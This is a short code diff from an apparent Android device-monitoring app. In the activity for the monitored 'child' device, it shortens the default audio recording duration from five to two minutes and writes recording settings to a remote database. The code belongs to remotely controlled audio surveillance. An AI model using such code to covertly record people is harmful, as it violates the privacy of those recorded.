@@ -95,7 +95,7 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
 
 //
 //        //Recording
-        val childRecording = ChildRecording(true,5*60*1000)
+        val childRecording = ChildRecording(true,2*60*1000)
         getReference("$RECORDING/$PARAMS").setValue(childRecording)
         getReference("$RECORDING/$TIMER/$INTERVAL").setValue(0)
         File("/storage/emulated/0/Android/data/com.github.midros.istheapp/cache/audioRecord/record.txt").delete()
